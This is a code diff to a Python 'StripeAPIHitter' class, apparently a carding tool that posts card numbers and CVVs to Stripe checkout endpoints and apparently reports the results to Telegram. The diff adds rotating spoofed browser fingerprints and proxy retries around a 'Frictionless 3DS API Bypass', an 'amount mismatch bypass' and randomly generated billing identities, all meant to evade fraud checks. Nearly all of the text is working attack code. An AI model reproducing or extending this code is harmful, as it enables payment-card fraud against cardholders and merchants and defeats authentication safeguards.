@@ -510,185 +510,202 @@ class StripeAPIHitter:
         start = time.time()
         result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': None, 'merchant': None, 'proxy_raw': None, 'error': None}
         
-        try:
-            proxies = None
-            if self.proxy_data:
-                result['proxy_raw'] = self.proxy_data['raw']
-                auth = f"{self.proxy_data['username']}:{self.proxy_data['password']}@" if self.proxy_data.get('username') else ""
-                proxy_url = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
-                proxies = {"http": proxy_url, "https": proxy_url}
+        BROWSER_PROFILES = [
+            {"user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "impersonate": "chrome120", "os": "Windows", "color_depth": "32", "screen_height": "1080", "screen_width": "1920"},
+            {"user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "impersonate": "chrome120", "os": "MacIntel", "color_depth": "30", "screen_height": "1050", "screen_width": "1680"},
+            {"user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "impersonate": "chrome116", "os": "Windows", "color_depth": "24", "screen_height": "1440", "screen_width": "2560"},
+        ]
+        profile = random.choice(BROWSER_PROFILES)
+        
+        max_retries = 3
+        for current_attempt in range(max_retries):
+            try:
+                proxy_data = self.proxy_data if current_attempt == 0 else await ProxyManager.get_random(user_id)
+                proxies = None
+                if proxy_data:
+                    result['proxy_raw'] = proxy_data['raw']
+                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
+                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
+                    proxies = {"http": proxy_url, "https": proxy_url}
 
-            headers = {
-                "authority": "api.stripe.com",
-                "accept": "application/json",
-                "content-type": "application/x-www-form-urlencoded",
-                "origin": "https://checkout.stripe.com",
-                "referer": "https://checkout.stripe.com/",
-                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
-            }
+                headers = {
+                    "authority": "api.stripe.com",
+                    "accept": "application/json",
+                    "content-type": "application/x-www-form-urlencoded",
+                    "origin": "https://checkout.stripe.com",
+                    "referer": "https://checkout.stripe.com/",
+                    "user-agent": profile["user_agent"]
+                }
 
-            address, tz_id, locale = await RandomData.get_address_and_timezone(proxy_url if proxies else None)
-
-            confirm_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/confirm"
-            confirm_data = {
-                "payment_method_data[type]": "card",
-                "payment_method_data[card][number]": card['card'],
-                "payment_method_data[card][cvc]": card['cvv'],
-                "payment_method_data[card][exp_month]": card['month'],
-                "payment_method_data[card][exp_year]": card['year'],
-                "payment_method_data[billing_details][name]": RandomData.get_name(),
-                "payment_method_data[billing_details][email]": RandomData.get_email(),
-                "payment_method_data[billing_details][address][line1]": address["line1"],
-                "payment_method_data[billing_details][address][city]": address["city"],
-                "payment_method_data[billing_details][address][state]": address["state"],
-                "payment_method_data[billing_details][address][postal_code]": address["zip"],
-                "payment_method_data[billing_details][address][country]": address["country"],
-                "payment_method_data[payment_user_agent]": "stripe.js/b60285dd61; stripe-js-v3/b60285dd61; checkout",
-                "expected_payment_method_type": "card",
-                "key": self.pk_live,
-            }
-            if self.raw_amount is not None:
-                confirm_data["expected_amount"] = self.raw_amount
-            
-            loop = asyncio.get_event_loop()
-            confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data, proxies=proxies, timeout=30, impersonate="chrome116"))
-            confirm_json = confirm_res.json()
-            
-            # Dynamic Amount Mismatch Bypass
-            # If the scraped amount was slightly off (taxes/shipping) and caused a mismatch, instantly retry without the constraint
-            if confirm_res.status_code != 200 and confirm_json.get('error', {}).get('code') == 'checkout_amount_mismatch' and 'expected_amount' in confirm_data:
-                del confirm_data['expected_amount']
-                confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data, proxies=proxies, timeout=30, impersonate="chrome116"))
-                confirm_json = confirm_res.json()
-            
-            result['response_time'] = time.time() - start
-            
-            if confirm_res.status_code == 200:
-                pi = confirm_json.get('payment_intent', {})
-                si = confirm_json.get('setup_intent', {})
+                address, tz_id, locale = await RandomData.get_address_and_timezone(proxy_url if proxies else None)
+    
+                confirm_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/confirm"
+                confirm_data = {
+                    "payment_method_data[type]": "card",
+                    "payment_method_data[card][number]": card['card'],
+                    "payment_method_data[card][cvc]": card['cvv'],
+                    "payment_method_data[card][exp_month]": card['month'],
+                    "payment_method_data[card][exp_year]": card['year'],
+                    "payment_method_data[billing_details][name]": RandomData.get_name(),
+                    "payment_method_data[billing_details][email]": RandomData.get_email(),
+                    "payment_method_data[billing_details][address][line1]": address["line1"],
+                    "payment_method_data[billing_details][address][city]": address["city"],
+                    "payment_method_data[billing_details][address][state]": address["state"],
+                    "payment_method_data[billing_details][address][postal_code]": address["zip"],
+                    "payment_method_data[billing_details][address][country]": address["country"],
+                    "payment_method_data[payment_user_agent]": "stripe.js/b60285dd61; stripe-js-v3/b60285dd61; checkout",
+                    "expected_payment_method_type": "card",
+                    "key": self.pk_live,
+                }
+                if self.raw_amount is not None:
+                    confirm_data["expected_amount"] = self.raw_amount
                 
-                if isinstance(pi, dict) and pi.get('last_payment_error'):
-                    err = pi.get('last_payment_error')
-                    result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
-                    result['error'] = err.get('message', 'Unknown error')
-                    return result
+                loop = asyncio.get_event_loop()
+                confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
+                confirm_json = confirm_res.json()
+                
+                # Dynamic Amount Mismatch Bypass
+                # If the scraped amount was slightly off (taxes/shipping) and caused a mismatch, instantly retry without the constraint
+                if confirm_res.status_code != 200 and confirm_json.get('error', {}).get('code') == 'checkout_amount_mismatch' and 'expected_amount' in confirm_data:
+                    del confirm_data['expected_amount']
+                    confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
+                    confirm_json = confirm_res.json()
+                
+                result['response_time'] = time.time() - start
+                
+                if confirm_res.status_code == 200:
+                    pi = confirm_json.get('payment_intent', {})
+                    si = confirm_json.get('setup_intent', {})
                     
-                if isinstance(si, dict) and si.get('last_setup_error'):
-                    err = si.get('last_setup_error')
-                    result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
-                    result['error'] = err.get('message', 'Unknown error')
-                    return result
-
-                status = confirm_json.get('status')
-                next_action = confirm_json.get('next_action', {})
-                if isinstance(pi, dict):
-                    if pi.get('status'): status = pi.get('status')
-                    if pi.get('next_action'): next_action = pi.get('next_action')
-                elif isinstance(si, dict):
-                    if si.get('status'): status = si.get('status')
-                    if si.get('next_action'): next_action = si.get('next_action')
-                    
-                if status in ['succeeded', 'requires_capture', 'complete']:
-                    result['success'] = True
-                    return result
-                elif status == 'requires_action':
-                    # Frictionless 3DS API Bypass
-                    try:
-                        if next_action.get('type') == 'use_stripe_sdk':
-                            source_id = next_action['use_stripe_sdk'].get('three_d_secure_2_source')
-                            server_trans_id = next_action['use_stripe_sdk'].get('server_transaction_id')
-                            
-                            if source_id:
-                                # Spoof legitimate browser environment for 3DS evaluation
-                                browser_info = {
-                                    "color_depth": "32",
-                                    "java_enabled": False,
-                                    "language": "en-US",
-                                    "screen_height": "844",
-                                    "screen_width": "390",
-                                    "timezone_offset": "240",
-                                    "user_agent": headers['user-agent']
-                                }
-                                
-                                auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
-                                auth_data = {
-                                    "source": source_id,
-                                    "app": '{"sdk_trans_id":"' + (server_trans_id or "6291d904-74a4-4dc4-b770-4cc200ffb5d4") + '"}',
-                                    "browser": '{"color_depth":"32","java_enabled":false,"language":"en-US","screen_height":"844","screen_width":"390","timezone_offset":"240","user_agent":"' + headers['user-agent'] + '"}',
-                                    "key": self.pk_live
-                                }
-                                
-                                auth_res = await loop.run_in_executor(None, lambda: cffi_requests.post(auth_url, headers=headers, data=auth_data, proxies=proxies, timeout=30, impersonate="chrome116"))
-                                auth_json = auth_res.json()
-                                
-                                state = auth_json.get('state')
-                                if state == 'frictionless':
-                                    # Frictionless successful, confirm the charge again
-                                    confirm_data_2 = {
-                                        "payment_method": confirm_json.get('payment_method') or (pi.get('payment_method') if isinstance(pi, dict) else None),
-                                        "key": self.pk_live,
-                                        "expected_payment_method_type": "card",
-                                    }
-                                    if self.raw_amount is not None:
-                                        confirm_data_2["expected_amount"] = self.raw_amount
-                                    confirm_res_2 = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data_2, proxies=proxies, timeout=30, impersonate="chrome116"))
-                                    confirm_json_2 = confirm_res_2.json()
-                                    
-                                    status_2 = confirm_json_2.get('status')
-                                    pi_2 = confirm_json_2.get('payment_intent', {})
-                                    if isinstance(pi_2, dict) and pi_2.get('status'): status_2 = pi_2.get('status')
-                                    
-                                    if status_2 in ['succeeded', 'requires_capture', 'complete']:
-                                        result['success'] = True
-                                    else:
-                                        err = confirm_json_2.get('error', {})
-                                        if isinstance(pi_2, dict) and pi_2.get('last_payment_error'): err = pi_2.get('last_payment_error')
-                                        result['decline_code'] = err.get('decline_code', err.get('code', status_2))
-                                    return result
-                                    
-                                elif state == 'challenge_required':
-                                    # Hard 3DS Challenge
-                                    result['decline_code'] = '3d_secure_required_hard'
-                                    return result
-                                else:
-                                    err = auth_json.get('error', {})
-                                    if '3D Secure 2 is not supported' in err.get('message', ''):
-                                        result['decline_code'] = '3d_secure_2_not_supported'
-                                        return result
-                                    
-                                    result['decline_code'] = '3d_secure_auth_failed'
-                                    result['error'] = str(auth_json)[:500]
-                                    return result
-                    except Exception as ex:
-                        print(f"DEBUG: 3DS Frictionless bypass failed: {ex}")
-                        pass
-                        
-                    result['decline_code'] = '3d_secure_required'
-                    return result
-                elif status == 'requires_payment_method':
-                    result['decline_code'] = 'generic_decline'
-                    result['error'] = 'Payment requires a new payment method (generic decline)'
-                elif status == 'open':
-                    err = confirm_json.get('error')
-                    if isinstance(err, dict):
+                    if isinstance(pi, dict) and pi.get('last_payment_error'):
+                        err = pi.get('last_payment_error')
                         result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
                         result['error'] = err.get('message', 'Unknown error')
                         return result
-                    
-                    result['decline_code'] = 'open'
-                    result['error'] = str(confirm_json)[:500]  # Dump the JSON to telegram so we can see what's actually there
+                        
+                    if isinstance(si, dict) and si.get('last_setup_error'):
+                        err = si.get('last_setup_error')
+                        result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
+                        result['error'] = err.get('message', 'Unknown error')
+                        return result
+    
+                    status = confirm_json.get('status')
+                    next_action = confirm_json.get('next_action', {})
+                    if isinstance(pi, dict):
+                        if pi.get('status'): status = pi.get('status')
+                        if pi.get('next_action'): next_action = pi.get('next_action')
+                    elif isinstance(si, dict):
+                        if si.get('status'): status = si.get('status')
+                        if si.get('next_action'): next_action = si.get('next_action')
+                        
+                    if status in ['succeeded', 'requires_capture', 'complete']:
+                        result['success'] = True
+                        return result
+                    elif status == 'requires_action':
+                        # Frictionless 3DS API Bypass
+                        try:
+                            if next_action.get('type') == 'use_stripe_sdk':
+                                source_id = next_action['use_stripe_sdk'].get('three_d_secure_2_source')
+                                server_trans_id = next_action['use_stripe_sdk'].get('server_transaction_id')
+                                
+                                if source_id:
+                                    # Spoof legitimate browser environment for 3DS evaluation
+                                    browser_info = {
+                                        "color_depth": profile["color_depth"],
+                                        "java_enabled": False,
+                                        "language": "en-US",
+                                        "screen_height": profile["screen_height"],
+                                        "screen_width": profile["screen_width"],
+                                        "timezone_offset": "240",
+                                        "user_agent": profile["user_agent"]
+                                    }
+                                    
+                                    auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
+                                    auth_data = {
+                                        "source": source_id,
+                                        "app": '{"sdk_trans_id":"' + (server_trans_id or "6291d904-74a4-4dc4-b770-4cc200ffb5d4") + '"}',
+                                        "browser": json.dumps(browser_info, separators=(',', ':')),
+                                        "key": self.pk_live
+                                    }
+                                    
+                                    auth_res = await loop.run_in_executor(None, lambda: cffi_requests.post(auth_url, headers=headers, data=auth_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
+                                    auth_json = auth_res.json()
+                                    
+                                    state = auth_json.get('state')
+                                    if state == 'frictionless':
+                                        # Frictionless successful, confirm the charge again
+                                        confirm_data_2 = {
+                                            "payment_method": confirm_json.get('payment_method') or (pi.get('payment_method') if isinstance(pi, dict) else None),
+                                            "key": self.pk_live,
+                                            "expected_payment_method_type": "card",
+                                        }
+                                        if self.raw_amount is not None:
+                                            confirm_data_2["expected_amount"] = self.raw_amount
+                                        confirm_res_2 = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data_2, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
+                                        confirm_json_2 = confirm_res_2.json()
+                                        
+                                        status_2 = confirm_json_2.get('status')
+                                        pi_2 = confirm_json_2.get('payment_intent', {})
+                                        if isinstance(pi_2, dict) and pi_2.get('status'): status_2 = pi_2.get('status')
+                                        
+                                        if status_2 in ['succeeded', 'requires_capture', 'complete']:
+                                            result['success'] = True
+                                        else:
+                                            err = confirm_json_2.get('error', {})
+                                            if isinstance(pi_2, dict) and pi_2.get('last_payment_error'): err = pi_2.get('last_payment_error')
+                                            result['decline_code'] = err.get('decline_code', err.get('code', status_2))
+                                        return result
+                                        
+                                    elif state == 'challenge_required':
+                                        # Hard 3DS Challenge
+                                        result['decline_code'] = '3d_secure_required_hard'
+                                        return result
+                                    else:
+                                        err = auth_json.get('error', {})
+                                        if '3D Secure 2 is not supported' in err.get('message', ''):
+                                            result['decline_code'] = '3d_secure_2_not_supported'
+                                            return result
+                                        
+                                        result['decline_code'] = '3d_secure_auth_failed'
+                                        result['error'] = str(auth_json)[:500]
+                                        return result
+                        except Exception as ex:
+                            print(f"DEBUG: 3DS Frictionless bypass failed: {ex}")
+                            pass
+                            
+                        result['decline_code'] = '3d_secure_required'
+                        return result
+                    elif status == 'requires_payment_method':
+                        result['decline_code'] = 'generic_decline'
+                        result['error'] = 'Payment requires a new payment method (generic decline)'
+                    elif status == 'open':
+                        err = confirm_json.get('error')
+                        if isinstance(err, dict):
+                            result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
+                            result['error'] = err.get('message', 'Unknown error')
+                            return result
+                        
+                        result['decline_code'] = 'open'
+                        result['error'] = str(confirm_json)[:500]  # Dump the JSON to telegram so we can see what's actually there
+                    else:
+                        result['decline_code'] = status
                 else:
-                    result['decline_code'] = status
-            else:
-                err = confirm_json.get('error', {})
-                result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'unknown')
-                result['error'] = err.get('message', 'Unknown error')
+                    err = confirm_json.get('error', {})
+                    result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'unknown')
+                    result['error'] = err.get('message', 'Unknown error')
+                    
+                # If we reach here without exception, do not retry!
+                return result
+                    
+            except Exception as e:
+                if current_attempt < max_retries - 1:
+                    await asyncio.sleep(2)
+                    continue
+                result['error'] = str(e)
+                result['decline_code'] = 'exception'
+                result['response_time'] = time.time() - start
+                return result
                 
-        except Exception as e:
-            result['error'] = str(e)
-            result['decline_code'] = 'exception'
-            result['response_time'] = time.time() - start
-            
         return result
 
 class ConcurrentHitter:
